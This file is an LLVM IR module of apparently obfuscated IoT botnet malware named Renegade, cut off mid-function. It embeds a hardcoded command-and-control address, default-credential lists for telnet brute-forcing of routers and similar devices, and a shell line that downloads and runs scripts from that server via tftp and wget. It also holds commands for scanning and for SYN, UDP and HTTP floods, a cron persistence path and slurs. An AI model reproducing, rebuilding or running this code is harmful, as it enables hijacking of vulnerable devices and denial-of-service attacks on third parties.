; ModuleID = 'host/ir_sub/Renegade.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"94.140.120.196:23913\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [10 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.10 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [18 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.11 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"letmein\00\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"epicrouter\00\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.85 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.20 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [193 x i8] c"cd /tmp || cd /var/run;rm -f ng.sh gchq.sh;tftp -r ng.sh -g 94.140.120.196;chmod +x ng.sh;sh ng.sh;rm -f ng.sh;wget -q http://94.140.120.196/gchq.sh;chmod +x gchq.sh;sh gchq.sh;rm -f gchq.sh\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"as\00", align 1
@.str.43 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"shell exec\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.46 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.49 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.51 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.52 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.53 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.55 = private unnamed_addr constant [17 x i8] c"wget -O /tmp/fff\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.58 = private unnamed_addr constant [14 x i8] c"FUCKINGFAGGOT\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.63 = private unnamed_addr constant [33 x i8] c"SCANNER SSH/TEL ON | SSH/TEL OFF\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.65 = private unnamed_addr constant [10 x i8] c"tel d0rk\0A\00", align 1
@.str.66 = private unnamed_addr constant [7 x i8] c"TEL ON\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"tel f0rk\0A\00", align 1
@.str.68 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.75 = private unnamed_addr constant [13 x i8] c"LUCKYLILDUDE\00", align 1
@.str.76 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.77 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@main.ismokeweed = private unnamed_addr constant [50 x i8] c"/etc/cron.hourly/sockaddr\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@main.r00t3d = private unnamed_addr constant [11 x i8] c"shell exec\00", align 1
@.str.79 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"FUCKYOU\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"GUCCILILNIGGA\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, -1640531527
  %7 = sub i32 %5, %6
  %8 = add i32 %5, -1640531527
  store i32 %7, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %9 = load i32, i32* %2, align 4
  %10 = sub i32 0, %9
  %11 = sub i32 0, -1640531527
  %12 = add i32 %10, %11
  %13 = sub i32 0, %12
  %14 = add i32 %9, -1640531527
  %15 = sub i32 0, -1640531527
  %16 = sub i32 %13, %15
  %17 = add i32 %13, -1640531527
  store i32 %16, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %18

; <label>:18:                                     ; preds = %74, %1
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 4096
  br i1 %20, label %21, label %80

; <label>:21:                                     ; preds = %18
  %22 = load i32, i32* %3, align 4
  %23 = sub i32 0, 3
  %24 = add i32 %22, %23
  %25 = sub nsw i32 %22, 3
  %26 = sext i32 %24 to i64
  %27 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %26
  %28 = load i32, i32* %27, align 4
  %29 = load i32, i32* %3, align 4
  %30 = sub i32 %29, 1614183008
  %31 = sub i32 %30, 2
  %32 = add i32 %31, 1614183008
  %33 = sub nsw i32 %29, 2
  %34 = sext i32 %32 to i64
  %35 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %34
  %36 = load i32, i32* %35, align 4
  %37 = xor i32 %28, -1
  %38 = and i32 -1462202387, %37
  %39 = xor i32 -1462202387, -1
  %40 = and i32 %28, %39
  %41 = xor i32 %36, -1
  %42 = and i32 %41, -1462202387
  %43 = and i32 %36, %39
  %44 = or i32 %38, %40
  %45 = or i32 %42, %43
  %46 = xor i32 %44, %45
  %47 = xor i32 %28, %36
  %48 = xor i32 %46, -1
  %49 = and i32 -1116938397, %48
  %50 = xor i32 -1116938397, -1
  %51 = and i32 %46, %50
  %52 = xor i32 -1640531527, -1
  %53 = and i32 %52, -1116938397
  %54 = and i32 -1640531527, %50
  %55 = or i32 %49, %51
  %56 = or i32 %53, %54
  %57 = xor i32 %55, %56
  %58 = xor i32 %46, -1640531527
  %59 = load i32, i32* %3, align 4
  %60 = xor i32 %57, -1
  %61 = and i32 -825113457, %60
  %62 = xor i32 -825113457, -1
  %63 = and i32 %57, %62
  %64 = xor i32 %59, -1
  %65 = and i32 %64, -825113457
  %66 = and i32 %59, %62
  %67 = or i32 %61, %63
  %68 = or i32 %65, %66
  %69 = xor i32 %67, %68
  %70 = xor i32 %57, %59
  %71 = load i32, i32* %3, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %72
  store i32 %69, i32* %73, align 4
  br label %74

; <label>:74:                                     ; preds = %21
  %75 = load i32, i32* %3, align 4
  %76 = add i32 %75, 1389066013
  %77 = add i32 %76, 1
  %78 = sub i32 %77, 1389066013
  %79 = add nsw i32 %75, 1
  store i32 %78, i32* %3, align 4
  br label %18

; <label>:80:                                     ; preds = %18
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, 1
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, 1
  %11 = xor i32 4095, -1
  %12 = xor i32 %9, %11
  %13 = and i32 %12, %9
  %14 = and i32 %9, 4095
  store i32 %13, i32* @rand_cmwc.i, align 4
  %15 = load i64, i64* %2, align 8
  %16 = load i32, i32* @rand_cmwc.i, align 4
  %17 = zext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = zext i32 %19 to i64
  %21 = mul i64 %15, %20
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = sub i64 %21, 1988823645864179416
  %25 = add i64 %24, %23
  %26 = add i64 %25, 1988823645864179416
  %27 = add i64 %21, %23
  store i64 %26, i64* %1, align 8
  %28 = load i64, i64* %1, align 8
  %29 = lshr i64 %28, 32
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* @c, align 4
  %31 = load i64, i64* %1, align 8
  %32 = load i32, i32* @c, align 4
  %33 = zext i32 %32 to i64
  %34 = add i64 %31, 7631567148339114524
  %35 = add i64 %34, %33
  %36 = sub i64 %35, 7631567148339114524
  %37 = add i64 %31, %33
  %38 = trunc i64 %36 to i32
  store i32 %38, i32* %3, align 4
  %39 = load i32, i32* %3, align 4
  %40 = load i32, i32* @c, align 4
  %41 = icmp ult i32 %39, %40
  br i1 %41, label %42, label %54

; <label>:42:                                     ; preds = %0
  %43 = load i32, i32* %3, align 4
  %44 = sub i32 %43, -217009763
  %45 = add i32 %44, 1
  %46 = add i32 %45, -217009763
  %47 = add i32 %43, 1
  store i32 %46, i32* %3, align 4
  %48 = load i32, i32* @c, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add i32 %48, 1
  store i32 %52, i32* @c, align 4
  br label %54

; <label>:54:                                     ; preds = %42, %0
  %55 = load i32, i32* %4, align 4
  %56 = load i32, i32* %3, align 4
  %57 = add i32 %55, -330192521
  %58 = sub i32 %57, %56
  %59 = sub i32 %58, -330192521
  %60 = sub i32 %55, %56
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %62 = zext i32 %61 to i64
  %63 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %62
  store i32 %59, i32* %63, align 4
  ret i32 %59
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %21, %1
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = call i32 @isspace(i32 %18) #10
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %4, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  store i32 %26, i32* %4, align 4
  br label %12

; <label>:28:                                     ; preds = %12
  br label %29

; <label>:29:                                     ; preds = %44, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %42

; <label>:33:                                     ; preds = %29
  %34 = load i8*, i8** %2, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = call i32 @isspace(i32 %39) #10
  %41 = icmp ne i32 %40, 0
  br label %42

; <label>:42:                                     ; preds = %33, %29
  %43 = phi i1 [ false, %29 ], [ %41, %33 ]
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %42
  %45 = load i32, i32* %5, align 4
  %46 = sub i32 0, %45
  %47 = sub i32 0, -1
  %48 = add i32 %46, %47
  %49 = sub i32 0, %48
  %50 = add nsw i32 %45, -1
  store i32 %49, i32* %5, align 4
  br label %29

; <label>:51:                                     ; preds = %42
  %52 = load i32, i32* %4, align 4
  store i32 %52, i32* %3, align 4
  br label %53

; <label>:53:                                     ; preds = %72, %51
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %5, align 4
  %56 = icmp sle i32 %54, %55
  br i1 %56, label %57, label %79

; <label>:57:                                     ; preds = %53
  %58 = load i8*, i8** %2, align 8
  %59 = load i32, i32* %3, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = add i32 %64, 96285348
  %67 = sub i32 %66, %65
  %68 = sub i32 %67, 96285348
  %69 = sub nsw i32 %64, %65
  %70 = sext i32 %68 to i64
  %71 = getelementptr inbounds i8, i8* %63, i64 %70
  store i8 %62, i8* %71, align 1
  br label %72

; <label>:72:                                     ; preds = %57
  %73 = load i32, i32* %3, align 4
  %74 = sub i32 0, %73
  %75 = sub i32 0, 1
  %76 = add i32 %74, %75
  %77 = sub i32 0, %76
  %78 = add nsw i32 %73, 1
  store i32 %77, i32* %3, align 4
  br label %53

; <label>:79:                                     ; preds = %53
  %80 = load i8*, i8** %2, align 8
  %81 = load i32, i32* %3, align 4
  %82 = load i32, i32* %4, align 4
  %83 = add i32 %81, 156161289
  %84 = sub i32 %83, %82
  %85 = sub i32 %84, 156161289
  %86 = sub nsw i32 %81, %82
  %87 = sext i32 %85 to i64
  %88 = getelementptr inbounds i8, i8* %80, i64 %87
  store i8 0, i8* %88, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %331, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %334

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %319

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %334

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %320

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %86, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %89

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = add i32 %76, 1297474473
  %78 = sub i32 %77, 48
  %79 = sub i32 %78, 1297474473
